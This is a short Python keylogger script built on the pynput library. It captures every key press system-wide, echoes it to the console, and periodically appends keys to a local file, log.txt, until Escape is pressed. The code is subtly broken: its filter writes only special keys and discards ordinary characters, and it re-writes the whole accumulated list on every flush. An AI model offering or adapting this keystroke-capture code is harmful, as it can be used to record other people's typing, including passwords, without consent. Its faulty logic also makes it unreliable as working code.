import pynput
from pynput.keyboard import Key, Listener

keys = []
actions = 0

def keyPress(key):
  global keys, actions
  actions += 1
  keys.append(key)
  if actions >= 5:
    actions = 0
    write_file(keys)
  print(f"{key} pressed.")

def keyRelease(key):
  if key == Key.esc: return False

def write_file(keys):
  with open("log.txt", "a") as file:
    for key in keys:
      k = str(key).replace("'", "")
      if k.find("Key") != -1:
        file.write(k)

with Listener(on_press=keyPress, on_release=keyRelease) as listener:
  listener.join()